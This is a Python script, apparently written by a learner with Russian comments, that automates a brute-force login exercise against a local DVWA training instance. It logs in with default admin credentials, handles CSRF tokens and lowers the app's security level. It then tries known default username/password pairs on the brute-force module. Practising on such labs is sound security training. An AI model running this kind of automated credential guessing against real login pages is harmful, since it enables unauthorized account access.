#!/usr/bin/python3
import requests
import http.cookiejar

print("DVWA BRUTEFORCE - FINAL ATTEMPT")
print("="*50)

# 1. Создаем сессию с сохранением cookies
s = requests.Session()

# 2. Получаем CSRF токен для логина
print("1. Get CSRF token...")
r = s.get("http://dvwa.local/login.php")
import re
csrf_match = re.search(r'user_token" value="([^"]+)"', r.text)
if csrf_match:
    csrf = csrf_match.group(1)
    print(f"   CSRF: {csrf}")
else:
    print("   No CSRF found")
    csrf = ""

# 3. Логинимся
print("2. Login...")
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': csrf
}
r = s.post("http://dvwa.local/login.php", data=login_data)
print(f"   Login status: {r.status_code}")

# 4. Проверяем куки
print(f"3. Cookies: {dict(s.cookies)}")

# 5. Security low
print("4. Set security low...")
r = s.get("http://dvwa.local/security.php")
csrf_match = re.search(r'user_token" value="([^"]+)"', r.text)
if csrf_match:
    security_csrf = csrf_match.group(1)
    s.post("http://dvwa.local/security.php", 
          data={'security':'low','seclev_submit':'Submit','user_token':security_csrf})
    print("   Security set to low")
else:
    s.post("http://dvwa.local/security.php",
          data={'security':'low','seclev_submit':'Submit'})

# 6. Пробуем brute force с разными подходами
print("\n5. Testing brute force...")
brute_url = "http://dvwa.local/vulnerabilities/brute/"

# Подход 1: Простой GET
test1 = f"{brute_url}?username=admin&password=password&Login=Login"
print(f"\nTest 1: Simple GET")
r = s.get(test1)
print(f"   Response: {len(r.text)} chars")
if 'Welcome' in r.text:
    print("   ✓ SUCCESS!")

# Подход 2: С другим пользователем
test2 = f"{brute_url}?username=gordonb&password=abc123&Login=Login"
print(f"\nTest 2: User gordonb")
r = s.get(test2)
print(f"   Response: {len(r.text)} chars")
if 'Welcome' in r.text:
    print("   ✓ SUCCESS!")

# Подход 3: Сохраняем ответ для анализа
print("\n6. Saving response for manual check...")
with open('final_response.html', 'w') as f:
    f.write(r.text)
print("   Saved to final_response.html")

# 7. Если всё еще 1523 chars - значит проблема
if len(r.text) == 1523:
    print("\n" + "!"*50)
    print("PROBLEM: Still getting login page (1523 chars)")
    print("DVWA is logging you out!")
    print("\nSOLUTION: Check these manually in browser:")
    print("1. http://dvwa.local/")
    print("2. Login with admin/password")
    print("3. Go to Brute Force module")
    print("4. Open browser Developer Tools (F12)")
    print("5. Go to Network tab")
    print("6. Submit login form")
    print("7. Check what cookies are sent")
    print("!"*50)

print("\n" + "="*50)
print("DONE")
